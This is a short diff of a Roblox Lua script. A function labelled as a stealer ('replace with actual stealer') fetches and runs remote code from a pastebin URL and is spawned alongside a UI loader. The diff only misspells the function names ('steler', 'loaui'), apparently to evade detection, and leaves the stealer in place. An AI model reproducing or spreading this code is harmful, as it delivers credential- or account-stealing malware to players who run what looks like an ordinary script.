@@ -1,10 +1,10 @@
-local function stealer()
+local function steler()
 loadstring(game:HttpGet("https://pastebin.com/raw/ZvehLyZ9"))() -- replace with actual stealer
 end
-local function loadui()
+local function loaui()
   loadstring(game:HttpGet("https://pastebin.com/raw/Q8NWfbXc"))()
 
 end
 
-task.spawn(stealer)
-task.spawn(loadui)
+task.spawn(steler)
+task.spawn(loaui)
